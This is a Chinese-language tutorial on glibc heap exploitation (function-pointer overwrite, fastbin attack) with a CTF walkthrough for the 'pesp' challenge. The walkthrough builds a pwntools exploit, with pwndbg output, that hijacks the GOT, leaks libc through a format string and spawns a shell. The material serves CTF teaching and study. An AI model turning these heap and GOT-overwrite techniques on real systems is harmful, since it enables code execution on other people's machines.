

# 堆漏洞利用

针对堆的攻击方式主要有两种：堆溢出和use after free

- fastbin attack
- use after free
- double free
- off by null & overlap
- tcache
- IO file
- large bin attack
- unsorted bin attack
- mmap attack
- The Fastbin Dup technique
- The Unsafe Unlink technique
- The Safe Unlink technique
- The Tcache Dup technique
- The House of Force technique
- The House of Orange technique
- The House of Spirit technique
- The House of Lore technique
- The House of Einherjar technique
- The House of Rabbit technique
- Using one-gadgets to drop a shell
- Leveraging a single-byte heap overflow to drop a shell
- Leveraging single null byte overflows for code execution
- The Google Poison Null Byte technique
- Heap Feng Shui



## 堆溢出(heap overflow)

- 缓冲区溢出发生在堆上
- 栈溢出可以直接覆盖函数返回地址控制rip
- 堆的特性导致堆上有更多种利用方式

> 针对栈溢出漏洞，如果使用了安全函数。栈使用strcpy_s等函数，比较难利用，但是到了堆上，由于堆的实现比较复杂，利用方式也就相对比较多，有uaf、doublefree等利用方式

> 堆溢出利用的本质：寻找可以被利用的结构体，经过堆风水，用堆溢出更改结构体，进而实现information leak或memory corruption，对于CTF而言套路性较强。

### 堆溢出覆写结构体内函数指针

```
struct NODE
{
	void (*printFunc)(struct NODE *);
	char data[0x18];
};

void printData(struct NODE *n)
{
	printf("the data is %s\n", n->data);
}

int main(int argc, char *argv[])
{
	struct NODE *n1 = (struct NODE *)malloc(sizeof(struct NODE));
	struct NODE *n2 = (struct NODE *)malloc(sizeof(struct NODE));

	memcpy(n2->data, "bbbbbbbb", 8);
	n2->printFunc = (void *)printData;
	n2->printFunc(n2);

	memcpy(n1->data, argv[1], strlen(argv[1]));  // heap overflow
	n2->printFunc(n2);                           // control RIP!!!
	return 0;
}
```

memcpy堆溢出之前：

```
pwndbg> x/14gx 0x230e010-0x10
0x230e000:	0x0000000000000000	0x0000000000000031 \
0x230e010:	0x0000000000000000	0x0000000000000000  | chunk_n1
0x230e020:	0x0000000000000000	0x0000000000000000 /
0x230e030:	0x0000000000000000	0x0000000000000031 \
0x230e040:	0x0000000000400616	0x6262626262626262  | chunk_n2    // 0x0400616 即为 n2->funcPtr
0x230e050:	0x0000000000000000	0x0000000000000000 /
0x230e060:	0x0000000000000000	0x0000000000000411
```

argv[1] = "aaaaaaaaaaaaaa...."，memcpy堆溢出之后：

```
pwndbg> x/14gx 0x230e010-0x10
0x230e000:	0x0000000000000000	0x0000000000000031
0x230e010:	0x0000000000000000	0x6161616161616161
0x230e020:	0x6161616161616161	0x6161616161616161
0x230e030:	0x6161616161616161	0x6161616161616161
0x230e040:	0x6161616161616161	0x6161616161616161
0x230e050:	0x0000000000006161	0x0000000000000000
0x230e060:	0x0000000000000000	0x0000000000000411
pwndbg> p *n2
$2 = {
  printFunc = 0x6161616161616161, 
  data = "aaaaaaaaaa", '\000' <repeats 13 times>
}
```

> 思考这样一个问题，为什么chunk_n2的prev_size和size不合法也可以控制RIP。这是由于该案例比较特殊，结构体包含函数指针，而在调用指针利用时，也没有多余的malloc和free来进行检查，所以不需要特别构造prev_size和size就可以利用成功。



## fastbin attack

- fastbin利用技术
     - Fast bin为单向链表，结构简单，容易伪造
     - 为了提高效率，安全检查少
     - 只针对Fast bin大小的chunk，small/large chunk不适用
- 利用思路
     - 空闲fast chunk如果发生溢出被覆盖，则链表指针fd可以被修改
     - 可以通过修改链表指针fd，在Fast bin链表中引入伪造的空闲Fast chunk
     - 下次分配时分配出伪造的Fast chunk
     - 伪造的Fast chunk可以在.bss全局变量处，也可以在栈上

![](images/堆漏洞利用/fastbin_attack1.png)

![](images/堆漏洞利用/fastbin_attack2.png)



**调试案例**


```
struct NODE
{
	// void (*printFunc)(struct NODE *);
	char data[0x10];
};

int main(int argc, char *argv[])
{
	struct NODE *n1 = (struct NODE *)malloc(sizeof(struct NODE));
	struct NODE *n2 = (struct NODE *)malloc(sizeof(struct NODE));
	free(n2);
	read(0, n1->data, 0x100);                      // heap overflow
	malloc(sizeof(struct NODE));
	struct NODE *newNode = (struct NODE*)malloc(sizeof(struct NODE));
	read(0, newNode->data, 0x10);
	return 0;
}
```

在free(n2)调用之后，第一次read调用之前，堆内存布局如下：

```
pwndbg> x/20gx 0xd5d010-0x10
0xd5d000:	0x0000000000000000	0x0000000000000021 \ chunk_n1
0xd5d010:	0x0000000000000000	0x0000000000000000 /
0xd5d020:	0x0000000000000000	0x0000000000000021 \ freed chunk_n2
0xd5d030:	[0x00000000000000]	0x0000000000000000 /                // 方括号处的为fd
0xd5d040:	0x0000000000000000	0x0000000000020fc1
0xd5d050:	0x0000000000000000	0x0000000000000000
0xd5d060:	0x0000000000000000	0x0000000000000000
0xd5d070:	0x0000000000000000	0x0000000000000000
0xd5d080:	0x0000000000000000	0x0000000000000000
0xd5d090:	0x0000000000000000	0x0000000000000000
pwndbg> p main_arena.fastbinsY 
$2 = {0xd5d020, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
pwndbg> 
```

read调用之后，触发溢出，堆内存布局如下：

```
pwndbg> x/20gx 0x1927010-0x10
0x1927000:	0x0000000000000000	0x0000000000000021 \ chunk_n1
0x1927010:	0x6161616161616161	0x6161616161616161 /
0x1927020:	0x6161616161616161	0x0000000000000021 \ freed chunk_n2
0x1927030:	[0x000000deadbeef]	0x0000000000000000 /                // 方括号处的为fd
0x1927040:	0x0000000000000000	0x0000000000020fc1
0x1927050:	0x0000000000000000	0x0000000000000000
0x1927060:	0x0000000000000000	0x0000000000000000
0x1927070:	0x0000000000000000	0x0000000000000000
0x1927080:	0x0000000000000000	0x0000000000000000
0x1927090:	0x0000000000000000	0x0000000000000000
pwndbg> fastbins 
fastbins
0x20: 0xd5d020 ◂— 0xdeadbeef
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
pwndbg> 
```

然后下一个malloc执行后，newNode malloc分配之前，fastbin如下：

```
pwndbg> p main_arena.fastbinsY 
$3 = {0xdeadbeef, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
pwndbg> fastbins 
fastbins
0x20: 0xdeadbeef ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

然后newNode节点将被分配到0xdeadbeef处，再下一步，read调用将可以达到write-anything-somewhere的目的。

	struct NODE *newNode = (struct NODE*)malloc(sizeof(struct NODE));  // get 0xdeadbeef
	read(0, newNode->data, 0x10);                                      // write-anything-somewhere

> 再次思考一个问题，为什么n2的prev_size不合法也可以正常malloc。这是因为prev_size用于在free时用来找前一个chunk地址，这里并没有调用free，所以可以正常malloc

### 伪造Fast chunk

- 在栈上伪造Fast chunk
  - 覆盖返回地址
- 在bss上伪造Fast chunk
  - 修改全局变量
- 在堆上伪造Fast chunk
  - 修改堆上数据

> 上面例子中为何是write-anything-somewhere，而不是write-anything-anywhere?(暂不考虑tcache)。这是因为因为malloc时会对fastbin chunk做检查，检查size是否合法

```
3383  if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
3384  {
3385      errstr = "malloc(): memory corruption (fast)";
3386  errout:
3387      malloc_printerr (check_action, errstr, chunk2mem (victim), av);
3388      return NULL;
3389  }
```

```
1600  /* offset 2 to use otherwise unindexable first 2 bins */
1601  #define fastbin_index(sz) \
1602      ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
```


因此伪造fastbin chunk时，所选的地址是否合适，就是看所选地址是否包含一个合法的size，而对size的检查就是依据上面的宏定义，取4字节的size，并做移位运算以对齐，这样寻找合适的地址有很大灵活性：
- 只需控制victim的size满足判断
- unsigned int只取4个byte，因此伪造时不用满足8个byte
- 因为>>, 伪造时也不需要对齐

例如下面列出的几个数据，都可作为合法size用来伪造相应的fastbin chunk

```
>>> (ctypes.c_uint32(0x71).value >> 4) - 2
5L
>>> (ctypes.c_uint32(0x7f).value >> 4) - 2
5L
>>> (ctypes.c_uint32(0x123456780000007f).value >> 4) - 2
5L
>>> 
```



### 堆溢出实战案例 - 网鼎杯2018 pesp

题目地址：http://github.com/bash-c/public_class_examples

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _QWORD *heap_func_ptrs; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  heap_func_ptrs = malloc(0x10uLL);
  *heap_func_ptrs = hello_message;
  heap_func_ptrs[1] = goodbye_message;
  ((void (__fastcall *)(signed __int64, _QWORD))*heap_func_ptrs)(16LL, 0LL);
  while ( 1 )
  {
    menu();
    read(0, buf, 8uLL);
    switch ( atoi(buf) )
    {
      case 1:
        show_item();
        break;
      case 2:
        add_item();
        break;
      case 3:
        change_item();
        break;
      case 4:
        remove_item();
        break;
      case 5:
        ((void (__fastcall *)(char *, char *))heap_func_ptrs[1])(buf, buf);// func pointer
        exit(0);
        return;
      default:
        puts("invaild choice!!!");
        break;
    }
  }
}
```

```
void add_item()
{
  signed int i; // [rsp+4h] [rbp-1Ch]
  int len; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( num > 99 )
  {
    puts("the team is full");
  }
  else
  {
    printf("Please enter the length of servant name:");
    read(0, buf, 8uLL);
    len = atoi(buf);
    if ( len )
    {
      for ( i = 0; i <= 99; ++i )
      {
        if ( !itemlist[i].cont )
        {
          itemlist[i].size = len;
          itemlist[i].cont = (char *)malloc(len);
          printf("Please enter the name of servant:");
          itemlist[i].cont[(signed int)read(0, itemlist[i].cont, len)] = 0;// off by null
          ++num;
          return;
        }
      }
    }
    else
    {
      puts("invaild length");
    }
  }
}
```

```
void remove_item()
{
  int idx; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h]
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index of servant:");
    read(0, buf, 8uLL);
    idx = atoi(buf);
    if ( itemlist[idx].cont )
    {
      free(itemlist[idx].cont);
      itemlist[idx].cont = 0LL;
      itemlist[idx].size = 0;
      puts("remove successful!!");
      --num;
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No servant in the team");
  }
}
```

在IDA中分析程序逻辑，发现一些问题和细节：

   - add_item()函数中有个off by null，末尾0字节溢出漏洞
   - change_item()函数中有堆溢出漏洞
   - remove_item()有指针置零操作，避免了double free问题，不存在问题

**解决思路 - fastbin attack**

  - 使用heap overflow更改fd实现write-anything-somewhere
  - 选择写GOT表，通过更改free@GOT为printf，利用格式化字符串漏洞leak libc
  - 通过程序的edit功能继续更改free@GOT为system
  - free("/bin/sh")->system("/bin/sh")

> 该题目通过off by null也可以解决，参考off by null部分

##### 详细调试实战

> 调试环境： Ubuntu 16.04 x64 (libc-2.23)
>
> 原题目提供了glibc2.23，因此配置glibc2.23环境，可以使用Ubuntu16.04的docker环境来调试。
>

仅利用change_item()函数的堆溢出。

先看下二进制的保护措施：

```
$ checksec pwn
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: Canary found
NX: NX enabled
PID: No PIE (0x400000)
```

**STEP1** 熟悉程序逻辑，编写exp框架

和之前一样，开两个终端，左侧运行程序和gdb附加调试，右侧开发和运行exploit。首先运行程序，熟悉菜单各交互逻辑，封装各个调用逻辑为函数。

![](images/堆漏洞利用/pesp_debug1.png)

编写出EXP框架如下：

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from time import sleep
context.log_level = "critical"
context.binary = "./pwn"
elf = context.binary
libc = elf.libc

def show():
    io.sendlineafter(":", "1")
	  sleep(0.01)

def add(length, name):
    io.sendlineafter(":", "2")
    io.sendlineafter(":", str(length))
    io.sendafter(":", name)
    sleep(0.01)

def edit(idx, length, name):
    io.sendlineafter(":", "3")
    io.sendlineafter(":", str(idx))
    io.sendlineafter(":", str(length))
    io.sendafter(":", name)
    sleep(0.01)

def delete(idx):
    io.sendlineafter(":", "4")
    io.sendlineafter(":", str(idx))
	  sleep(0.01)

io = process("./pwn")

# 具体触发利用代码实现...

io.interactive()
```

>注意上面有的地方用了sendafter而不用sendlineafter，是因为目标程序使用了read函数接受输入，会读入换行符\n，产生干扰，所以用send，所以也需要sleep一下把前后两个数据包隔开，以免发送的时候前后两个数据包被合在一起出现粘包问题

**STEP2** 触发漏洞并开始调试

接下来调用接口函数触发漏洞利用：

```
add(0x50, '000000')          # chunk0
add(0x50, '111111')          # chunk1
delete(1)                    # free(chunk1)
pause()
edit(0, 0x100, 'R' * 0x100)  # 通过相邻的chunk0溢出更改chunk1的fd
```

> 注：虽然这里分配两个节点都是0x50，但第一个节点并不必一定是0x50，例如0x10也是可以的，因为这样分配出的两个chunk依然相邻，可以触发溢出覆写。但第二个节点作为被覆写的chunk，选取0x50是为了匹配GOT附近0x60的size的，不能随意变化。

先创建两个fastbin chunk，然后把chunk1释放掉。再调用edit接口写入超长字符串触发溢出，覆盖chunk1。

为了方便调试，在溢出前添加pause()，在此暂停脚本执行，用于gdb附加调试。当脚本暂停时，在左侧窗口执行如下命令附加目标进程：

```
gdb -q -p `pidof pwn` -ex "*0x40BC05" -ex "c"
```

这时候看下堆的情况，通过pwndbg插件可以方便的查看相关信息：

```
pwndbg> heapbase               # 查看heapbase地址
heapbase:  0x98f000
pwndbg> x/40gx 0x98f000        # 查看堆分配情况
0x9f8000:       0x0000000000000000      0x0000000000000021 \ 这里是程序main函数里分配内存存储hello_message和
0x9f8010:       0x0000000000400896      0x00000000004008b1 / goodbye_message指针的，这里我们不关心
0x9f8020:       0x0000000000000000      0x0000000000000061 \
0x9f8030:       0x0000303030303030      0x0000000000000000  |
0x9f8040:       0x0000000000000000      0x0000000000000000  | chunk0
0x9f8050:       0x0000000000000000      0x0000000000000000  |
0x9f8060:       0x0000000000000000      0x0000000000000000  |
0x9f8070:       0x0000000000000000      0x0000000000000000 /
0x9f8080:       0x0000000000000000      0x0000000000000061 \
0x9f8090:       0x0000000000000000      0x0000000000000000  |
0x9f80a0:       0x0000000000000000      0x0000000000000000  | chunk1
0x9f80b0:       0x0000000000000000      0x0000000000000000  |
0x9f80c0:       0x0000000000000000      0x0000000000000000  |
0x9f80d0:       0x0000000000000000      0x0000000000000000 /
0x9f80e0:       0x0000000000000000      0x0000000000020f21
0x9f80f0:       0x0000000000000000      0x0000000000000000
pwndbg> fastbins               # 查看fastbin链
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x9f8080 ◂— 0x0
0x70: 0x0
0x80: 0x0
pwndbg> p main_arena.fastbinsY   # 查看fastbin
$1 = {0x0, 0x0, 0x0, 0x0, 0x9f8080, 0x0, 0x0, 0x0, 0x0, 0x0}
```

**STEP3 **修改脚本的edit操作，计算一下到第二个堆块fd指针的距离，构造合法的size，并尝试覆盖fd指针为0xdeadbeef。

```
add(0x50, '000000')
add(0x50, '111111')
delete(1)
pause()
edit(0, 0x100, flat('0' * 0x50, '00000000', 0x61, 0xdeadbeef))
add(0x50, 'xxxxxxxx')
add(0x50, 'xxxxxxxx')
```

再次附加调试，并查看fastbin，可以看到已经指到0xdeadbeef上。然后连续两次分配就可以将0xdeadbeef地址分配出来。

```
pwndbg> heapbase # 查看heapbase地址，这次变为0xaa7000
heapbase:  0xaa7000
pwndbg> x/40gx 0xaa7000           # 查看堆分配情况，fd被覆盖成0xdeadbeef
0xaa7000:      0x0000000000000000      0x0000000000000021
0xaa7010:      0x0000000000400896      0x00000000004008b1
0xaa7020:      0x0000000000000000      0x0000000000000061 \
0xaa7030:      0x3030303030303030      0x3030303030303030  |
0xaa7040:      0x3030303030303030      0x3030303030303030  | chunk0
0xaa7050:      0x3030303030303030      0x3030303030303030  |
0xaa7060:      0x3030303030303030      0x3030303030303030  |
0xaa7070:      0x3030303030303030      0x3030303030303030 /
0xaa7080:      0x3030303030303030      0x0000000000000061 \
0xaa7090: fd-> [0x000000deadbeef]      0x0000000000000000  |
0xaa70a0:      0x0000000000000000      0x0000000000000000  | chunk1
0xaa70b0:      0x0000000000000000      0x0000000000000000  |
0xaa70c0:      0x0000000000000000      0x0000000000000000  |
0xaa70d0:      0x0000000000000000      0x0000000000000000 /
0xaa70e0:      0x0000000000000000      0x0000000000020f21
0xaa70f0:      0x0000000000000000      0x0000000000000000
pwndbg> fastbins           # 查看fastbin链，指向0xdeadbeef
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0xaa7080 ◂— 0xdeadbeef
0x70: 0x0
0x80: 0x0
pwndbg>
```

**STEP4** 查看GOT表，查找合适的地址，尝试将fastbin chunk伪造到附近，用于覆写GOT表。前面0xdeadbeef不是一个合法地址，现在看下哪里可以改，通过checksec命令，看到可以改got，可以把free覆写成system，再通过调用free("/bin/sh")就可以执行shell。
然后看下附近有没有合法的size可以供利用，只要找任意四字节满足条件就可以。发现一个0x60，和0x50在同一个chunk里，是可以用的，把地址0x601ffa记下

```
pwndbg> checksec                        # 查看保护情况，确定GOT是否可写
[*] '/pwn/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
pwndbg> got                             # 查看GOT表，其中free@GOT地址为0x682018
GOT protection: Partial RELRO | GOT functions: 12
[0x602018] free@GLIBC_2.2.5 -> 0x7f56bc4334f0 (free)
[0x602020] puts@GLIBC_2.2.5 -> 0x7f56bc41e690 (puts)
[0x602028] __stack_chk_fail@GLIBC_2.4 -> 0x4006f6 (__stack_chk_fail@plt+6)
[0x602030] printf@GLIBC_2.2.5 -> 0x7f56bc404800 (printf)
[0x602038] close@GLIBC_2.2.5 -> 0x400716 (close@plt+6)
...
pwndbg> x/40gx 0x602018-0x40            # 查看free@GOT附近内存，查找是否有合适的size伪造chunk
0x601fd8:       0x0000000000000000      0x0000000000000000
0x601fe8:       0x0000000000000000      0x0000000000000000
0x601ff8:       0x0000000000000000      [0x00000000601e28]       # 注意这里的0x60作size合适
0x602008:       0x00007f56bc9a0168      0x00007f56bc790e10
0x602018:       0x00007f56bc4334f0      0x00007f56bc41e690
...
pwndbg> x/4gx 0x601ffa                  # 找到了合适的伪造chunk地址，注意这里选的地址不必对齐
0x601ffa:       0x1e28000000000000      [0x01680000000060]       # fake size
0x60200a:       0x0e1000007f56bc9a      0x34f000007f56bc79
```

改下脚本，将前面0xdeadbeef改成0x601ffa，然后连续两次malloc就可以分配到目标地址，即可以读写GOT

```
edit(0, 0x100, flat('0' * 0x50, '00000000', 0x61, 0x601ffa))
```

再次附加调试，查看fastbin链已经成功链到选取的got地址处

```
pwndbg> heapbase                           # 查看heapbase地址，这次变为0x7cf000
heapbase:  0x7cf000
pwndbg> x/40gx 0x7cf000                    # 查看堆分配情况，fd被覆盖成0x601ffa
0x7cf000:      0x0000000000000000      0x0000000000000021
0x7cf010:      0x0000000000400896      0x00000000004008b1
0x7cf020:      0x0000000000000000      0x0000000000000061 \
0x7cf030:      0x3030303030303030      0x3030303030303030  |
0x7cf040:      0x3030303030303030      0x3030303030303030  | chunk0
0x7cf050:      0x3030303030303030      0x3030303030303030  |
0x7cf060:      0x3030303030303030      0x3030303030303030  |
0x7cf070:      0x3030303030303030      0x3030303030303030 /
0x7cf080:      0x3030303030303030      0x0000000000000061 \
0x7cf090: fd-> [0x00000000601ffa]      0x0000000000000000  |
0x7cf0a0:      0x0000000000000000      0x0000000000000000  | chunk1
0x7cf0b0:      0x0000000000000000      0x0000000000000000  |
0x7cf0c0:      0x0000000000000000      0x0000000000000000  |
0x7cf0d0:      0x0000000000000000      0x0000000000000000 /
0x7cf0e0:      0x0000000000000000      0x0000000000020f21
0x7cf0f0:      0x0000000000000000      0x0000000000000000
pwndbg> fastbins                           # 查看fastbin链，从 0x7cf080 指向 0x601ffa
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x7cf080 —▸ 0x601ffa ◂— 0xfe1000007f2f1ec0
0x70: 0x0
0x80: 0x0
pwndbg> x/4gx 0x7cf080                     # 查看第一个free chunk，0x7cf080
0x7cf080:      0x3030303030303030      0x0000000000000061
0x7cf090:      0x0000000000601ffa      0x0000000000000000
pwndbg> x/4gx 0x601ffa                     # 查看第二个free chunk，0x601ffa，也就是我们构造chunk
0x601ffa:       0x1e28000000000000      0xf168000000000060
0x60200a:       0xfe1000007f2f1ec0      0x24f000007f2f1e9f
pwndbg> got                                # 查看got
GOT protection: Partial RELRO | GOT functions: 12
[0x602018] free@GLIBC_2.2.5 -> 0x7f2f1e6a24f0 (free)
[0x602020] puts@GLIBC_2.2.5 -> 0x7f2f1e68d690 (puts)
[0x602028] __stack_chk_fail@GLIBC_2.4 -> 0x4006f6 (__stack_chk_fail@plt+6)
[0x602030] printf@GLIBC_2.2.5 -> 0x7f2f1e673800 (printf)
[0x602038] close@GLIBC_2.2.5 -> 0x400716 (close@plt+6)
...
```

**STEP5** 修改脚本并运行，并附加调试

```
add(0x50, '000000')
add(0x50, '111111')
delete(1)
pause()
edit(0, 0x100, flat('0' * 0x50, '00000000', 0x61, 0x601ffa))
add(0x50, 'xxxxxxxx')
add(0x50, cyclic(n = 8, length = 0x30))
```

断点在add_item()函数上，单步跟踪两次malloc分配，并查看got，发现被成功覆写

```
pwndbg> b add_item   # 断点调试
pwndbg> ni           # 单步调试
pwndbg> got          # 查看GOT表，free@GOT等已经成功被覆盖为目标地址
GOT protection: Partial RELRO | GOT functions: 12
[0x602018] free@GLIBC_2.2.5 -> 0x6161616161636161 ('aacaaaaa')
[0x602020] puts@GLIBC_2.2.5 -> 0x6161616161646161 ('aadaaaaa')
[0x602028] __stack_chk_fail@GLIBC_2.4 -> 0x6161616161656161 ('aaeaaaaa')
[0x602030] printf@GLIBC_2.2.5 -> 0x6161616161666161 ('aafaaaaa')
[0x602038] close@GLIBC_2.2.5 -> 0x6161
[0x602040] read@GLIBC_2.2.5 -> 0x7fefaa724250 (read)
[0x602048] __libc_start_main@GLIBC_2.2.5 -> 0x7fefaa64d740 (__libc_start_main)
...
```

**STEP6** 计算分配地址到free的got表偏移，并覆写为printf地址用于leak libc
分配到目标地址后，就可以往这个地址往后写数据。需精确计算一下覆写偏移并修改脚本，现在我们还不知道system的地址，因此如果要覆写成system，首先需要leak libc，所以需要先把free改成printf地址，就可以构造出格式化字符串漏洞，调用free("%p")就相当于调用printf("%p")，使用格式化字符串漏洞进行leak是比较方便的。

```
add(0x50, '000000')
add(0x50, '111111')
add(0x50, '%p')
delete(1)
pause()
edit(0, 0x100, flat('0' * 0x50, '00000000', 0x61, 0x601ffa))
add(0x50, 'xxxxxxxx')
add(0x50, flat('\0' * 14, elf.sym['printf']))
delete(2)
```

运行脚本尝试覆写为printf地址时，程序报错了，看了下原来是off by null问题，把后面的puts的got表地址尾部字节覆写为0x00导致报错，这里由于是64位指针，所以只需写满6字节就可以了，不用写满8字节，这样就可以避免off by null的影响：

```
add(0x50, flat('\0' * 14, flat(elf.sym['printf'])[:6])     # 只需写满6字节，避免off by null的影响
```

调整后重新调试，当执行到free@plt时，由于GOT被覆写，实际执行的是printf@plt地址0x4006d0：

```
    0x400ccd <remove_item+128>    shl    rax, 4
    0x400cd1 <remove_item+132>    add    rax, itemlist+8 <0x6020c8>
    0x400cd7 <remove_item+138>    mov    rax, qword ptr [rax]
    0x400cda <remove_item+141>    mov    rdi, rax
 >  0x400cdd <remove_item+144>    call   free@plt <0x4006d0>       # GOT劫持后实际执行的是printf@plt
        ptr: 0x199c0f0 ◂— 0x7025 /* '%p' */
    0x400ce2 <remove_item+149>    mov    eax, dword ptr [rbp - 0x14]
```

执行到printf时(即上面call free@plt <0x4006d0>这行代码)，需要按如下方法调整一下格式化字符串参数来实现leak libc：

```
pwndbg> stack 20                     # 查看栈，找到指向__libc_start_main地址的栈地址
00:0000│ rsp  0x7ffe2252cb00 —▸ 0x7ffe2252cc30 ◂— 0x1
01:0008│      0x7ffe2252cb08 ◂— 0x200000000
02:0010│      0x7ffe2252cb10 ◂— 0xa32 /* '2\n' */
03:0018│      0x7ffe2252cb18 ◂— 0xe8283e24c315cb00
04:0020│ rbp  0x7ffe2252cb20 —▸ 0x7ffe2252cb50 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15
05:0028│      0x7ffe2252cb28 —▸ 0x400ead (main+246) ◂— jmp    0x400ed3
06:0030│      0x7ffe2252cb30 ◂— 0x400400ee0
07:0038│      0x7ffe2252cb38 —▸ 0x199c010 —▸ 0x400896 (hello_message) ◂— push   rbp
08:0040│      0x7ffe2252cb40 —▸ 0x7ffe22520a34 ◂— 0x0
09:0048│      0x7ffe2252cb48 ◂— 0xe8283e24c315cb00
0a:0050│      0x7ffe2252cb50 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15
0b:0058│      0x7ffe2252cb58 —▸ 0x7f3ca0ad9830 (__libc_start_main+240)   # 输出栈地址0x7ffe2252cb58处值就可以
0c:0060│      0x7ffe2252cb60 ◂— 0x0
0d:0068│      0x7ffe2252cb68 —▸ 0x7ffe2252cc38 —▸ 0x7ffe2252d92e ◂— '/pwn/pwn'
0e:0070│      0x7ffe2252cb70 ◂— 0x100000000
0f:0078│      0x7ffe2252cb78 —▸ 0x400db7 (main) ◂— push   rbp
10:0080│      0x7ffe2252cb80 ◂— 0x0
11:0088│      0x7ffe2252cb88 ◂— 0xe7ee3803375ceb20
12:0090│      0x7ffe2252cb90 —▸ 0x4007a0 (_start) ◂— xor    ebp, ebp
13:0098│      0x7ffe2252cb98 —▸ 0x7ffe2252cc30 ◂— 0x1
pwndbg> fmtarg 0x7ffe2252cb58
The index of format argument: 17     # 构造格式化参数，printf("%17$p")的时候就可以把目标地址打印出来
pwndbg> xinfo 0x7f3ca0ad9830         # 查看__libc_start_main虚拟地址对应的偏移量
Extended information for virtual address 0x7f3ca0ad9830:

  Containing mapping:
    0x7f3ca0ab9000     0x7f3ca0c79000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so

  Offset information:
         Mapped Area 0x7f3ca0ad9830 = 0x7f3ca0ab9000 + 0x20830
         File (Base) 0x7f3ca0ad9830 = 0x7f3ca0ab9000 + 0x20830
      File (Segment) 0x7f3ca0ad9830 = 0x7f3ca0ab9000 + 0x20830             # 所以得到偏移量为0x20830
         File (Disk) 0x7f3ca0ad9830 = /lib/x86_64-linux-gnu/libc-2.23.so + 0x20830

 Containing ELF sections:
               .text 0x7f3ca0ad9830 = 0x7f3ca0ad88b0 + 0xf80
```

根据以上信息，修改脚本如下并运行，获取到libc地址

```
add(0x50, '000000')
add(0x50, '111111')
add(0x50, '.%17$p.')                                   # 注意这里的技巧，两个.用来方便标示和截取地址
delete(1)
edit(0, 0x100, flat('0' * 0x50, '00000000', 0x61, 0x601ffa))
add(0x50, 'xxxxxxxx')
add(0x50, flat('\0' * 14, flat(elf.sym['printf'])[:6])
pause()
delete(2)                                              # 触发free(".%17$p.")也就是printf(".%17$p.")
io.recvutil('.')
libc.address = int(io.recvutil('.', drop = True), 16) - 0x20830        # 减去上面查到的偏移量0x20830
print('libc @ {:0x}'.format(libc.address))
assert libc.address & 0xfff == 0
```

**STEP7** 编辑节点，覆写free@GOT为system，然后free('/bin/sh')即为system('/bin/sh')
先通过telescope查看全局变量处的节点结构体列表itemlist，确定下目标节点的下标

```
pwndbg> telescope 0x6020C0
pwndbg> telescope 0x6020C0 20
00:0000│   0x6020c0 (itemlist) ◂— 0x50                                      # 0号节点
01:0008│   0x6020c8 (itemlist+8) —▸ 0x1862030 ◂— '0000000000000000000
02:0010│   0x6020d0 (itemlist+16) ◂— 0x50                                   # 1号节点
03:0018│   0x6020d8 (itemlist+24) —▸ 0x1862090 ◂— 'xxxxxxxx'
04:0020│   0x6020e0 (itemlist+32) ◂— 0x50                                   # 2号节点
05:0028│   0x6020e8 (itemlist+40) —▸ 0x18620f0 ◂— 0x2e70243731252e /* '.%17$p.' */
06:0030│   0x6020f0 (itemlist+48) ◂— 0x50                                   # 3号节点
07:0038│   0x6020f8 (itemlist+56) —▸ 0x60200a (_GLOBAL_OFFSET_TABLE_+10) ◂— 0x0
08:0040│   0x602100 (itemlist+64) ◂— 0x0
... ↓
pwndbg>
```

可以看到改第3个结构体就可以改free got，同样也只发送6字节避免off by null影响。

```
edit(3, 0x50, flat('\0' * 14, flat(libc.sym['system'])[:6]))
```

运行并调试查看got表，已经被覆盖成system地址

```
pwndbg> got
GOT protection: Partial RELRO | GOT functions: 12
[0x602018] free@GLIBC_2.2.5 -> 0x7f9070179390 (system) ◂— test   rdi, rdi
[0x602020] puts@GLIBC_2.2.5 -> 0x7f90701a3690 (puts) ◂— push   r12
[0x602028] __stack_chk_fail@GLIBC_2.4 -> 0x4006f6 (__stack_chk_fail@plt+6) ◂— push   2
[0x602030] printf@GLIBC_2.2.5 -> 0x7f9070189800 (printf) ◂— sub    rsp, 0xd8
[0x602038] close@GLIBC_2.2.5 -> 0x400716 (close@plt+6) ◂— push   4
```

**STEP8** 新增节点，构造/bin/sh参数，并调用free('/bin/sh')即system('/bin/sh')，成功获得shell

```
add(0x10, "/bin/sh\0")
delete(2)
```

其中节点标号2可以通过梳理逻辑确定，也可以通过telescope命令确定：

```
pwndbg> telescope 0x6020c0
00:0000│   0x6020c0 (itemlist) ◂— 0x50                                   # 0号节点
01:0008│   0x6020c8 (itemlist+8) —▸ 0x12bb030 ◂— '00000000000....
02:0010│   0x6020d0 (itemlist+16) ◂— 0x50                                # 1号节点
